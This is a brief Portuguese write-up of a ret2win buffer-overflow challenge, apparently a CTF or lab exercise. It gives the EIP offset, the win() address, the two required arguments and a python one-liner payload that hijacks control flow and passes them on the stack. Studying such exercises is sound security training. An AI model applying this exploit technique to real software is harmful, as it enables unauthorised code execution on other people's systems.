Aqui, também temos um buffer overflow ret2win básico. A diferença é que aqui a função `win()` espera dois argumentos, que devemos passar manualmente pela stack.

![](/Screenshots/Pasted%20image%2020220315221710.png)

O primeiro argumento é esperado que seja `0xCAFEF00D`, e o segundo `0xF00DF00D`

Com 112 bytes + 4 , conseguimos sobrescrever o EIP

![](/Screenshots/Pasted%20image%2020220329111820.png)

A função `win()` está no endereço `0x08049296`

![](/Screenshots/Pasted%20image%2020220329112019.png)

Para passar os dois argumentos para ela, basta continuar sobrescrevendo o buffer e fornecê-los normalmente:

`112 bytes + win() + 4 bytes padding + primeiro argumento + segundo argumento`

Para isso:

`python -c "print('A'*112 + '\x96\x92\x04\x08' + 'AAAA' + '\x0d\xf0\xfe\xca' + '\x0d\xf0\x0d\xf0')"`

![](/Screenshots/Pasted%20image%2020220316095020.png)